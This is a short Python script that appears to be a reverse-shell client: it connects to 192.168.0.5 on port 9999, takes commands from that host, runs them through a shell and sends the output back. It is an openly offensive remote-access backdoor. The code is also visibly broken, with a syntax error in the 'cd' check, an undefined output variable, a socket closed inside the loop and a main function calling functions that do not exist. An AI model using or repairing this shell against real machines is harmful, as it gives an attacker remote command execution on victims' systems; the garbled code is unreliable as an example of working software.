import os
import socket
import subprocess

host = '192.168.0.5'
port = 9999
s = socket.socket()
s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8"): == "cd":
        os.chdir('data[3:].decode("utf-8")')
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)
    s.close()





def main():
    socket_create()


    socket_connect()
    receive_commands()

main()